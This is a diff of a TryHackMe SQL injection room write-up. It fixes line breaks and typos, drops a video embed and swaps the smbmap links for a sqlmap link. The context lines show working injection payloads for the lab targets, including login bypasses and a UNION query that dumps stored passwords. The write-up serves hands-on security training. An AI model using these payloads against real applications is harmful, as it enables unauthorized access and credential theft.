@@ -33,8 +33,6 @@ All the scripts mentioned in the tasks can be viewed and downloaded by visiting 
 
 ### Task 2: Introduction to SQL Injection: Part 1
 
-<iframe width="1232" height="560" src="https://www.youtube.com/embed/ciNHn38EyRc" title="Running an SQL Injection Attack - Computerphile" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-
 SQL injection is a technique through which attackers can execute their own malicious SQL statements generally referred to as a malicious payload. Through the malicious SQL statements, attackers can steal information from the victim’s database; even worse, they may be able to make changes to the database. Our employee management web application has SQL injection vulnerabilities, which mimic the mistakes frequently made by developers.
 
 Applications will often need dynamic SQL queries to be able to display content based on different conditions set by the user. To allow for dynamic SQL queries, developers often concatenate user input directly into the SQL statement. Without checks on the received input, string concatenation becomes the most common mistake that leads to SQL injection vulnerability. Without input sanitization, the user can make the database interpret the user input as a SQL statement instead of as data. In other words, the attacker must have access to a parameter that they can control, which goes into the SQL statement. With control of a parameter, the attacker can inject a malicious query, which will be executed by the database. If the application does not sanitize the given input from the attacker-controlled parameter, the query will be vulnerable to SQL injection attack.
@@ -157,7 +155,7 @@ For information on how Burp Suite works, visit the [Burp Suite](https://tryhackm
 
 Login with
 
-Usermname: `1 or 1=1-- -`
+Usermname: `1 or 1=1-- -`  
 Password: `whatever`
 
 to get the flag.
@@ -168,7 +166,7 @@ Answer: `THM{<REDACTED>}`
 
 Login with
 
-Usermname: `1' or '1'='1'-- -`
+Usermname: `1' or '1'='1'-- -`  
 Password: `whatever`
 
 to get the flag.
@@ -179,7 +177,7 @@ Answer: `THM{<REDACTED>}`
 
 Trying to login with
 
-Usermname: `1' or 1=1-- -`
+Usermname: `1' or 1=1-- -`  
 Password: `whatever`
 
 results in an error message of `The input fields cannot contain special characters`.
@@ -309,7 +307,7 @@ The same enumeration demonstrated for finding tables and column names must be do
 
 Login with
 
-- **profileID**: 10
+- **profileID**: 10  
 - **password**: toor
 
 then click on the `Edit Profile` link in the upper left corner.
@@ -373,7 +371,7 @@ Bypass the login and retrieve the flag.
 
 Login with
 
-**Usermname**: `1' or 1=1-- -`
+**Usermname**: `1' or 1=1-- -`  
 **Password**: `whatever`
 
 to get the flag.
@@ -479,7 +477,7 @@ Exploit the vulnerable login form and retrieve the flag.
 
 Login with
 
-**Usermname**: `' UNION SELECT 1,group_concat(password) FROM users-- -`
+**Usermname**: `' UNION SELECT 1,group_concat(password) FROM users-- -`  
 **Password**: `whatever`
 
 and check the `Logged in as` username in the upper right corner for the flag.
@@ -1110,7 +1108,7 @@ Finally, we get the flag from the output file
 
 Alternatively, we can register an account with the following data:
 
-- **Username**: `' union select 1,group_concat(password) from users'`
+- **Username**: `' union select 1,group_concat(password) from users'`  
 - **Password**: `cajac`
 
 Then login with this account, and go to the `Notes` page and find the flag among the notes.
@@ -1157,7 +1155,7 @@ Create a new user and exploit the vulnerability in the update password function 
 
 Create a user with the following data:
 
-**Usermname**: `admin' -- -`
+**Username**: `admin' -- -`  
 **Password**: `cajac`
 
 and then login with the new user.
@@ -1208,7 +1206,7 @@ Use what you learned about UNION-based SQL injection and exploit the vulnerable 
 
 Create a user with the following data:
 
-**Usermname**: `cajac`
+**Username**: `cajac`  
 **Password**: `cajac`
 
 and then login with the new user.
@@ -1312,7 +1310,7 @@ Use what you learned about UNION-based SQL injection and exploit the vulnerable 
 
 Create a user with the following data:
 
-**Usermname**: `cajac`
+**Username**: `cajac`  
 **Password**: `cajac`
 
 and then login with the new user.
@@ -1337,6 +1335,5 @@ For additional information, please see the references below.
 - [SQL Injection - PortSwigger](https://portswigger.net/web-security/sql-injection)
 - [SQL injection - Wikipedia](https://en.wikipedia.org/wiki/SQL_injection)
 - [SQL injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [Smbmap - GitHub](https://github.com/ShawnDEvans/smbmap)
-- [Smbmap - Kali Tools](https://www.kali.org/tools/smbmap/)
+- [sqlmap - Homepage](https://sqlmap.org/)
 - [Testing for SQL Injection - WSTG - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
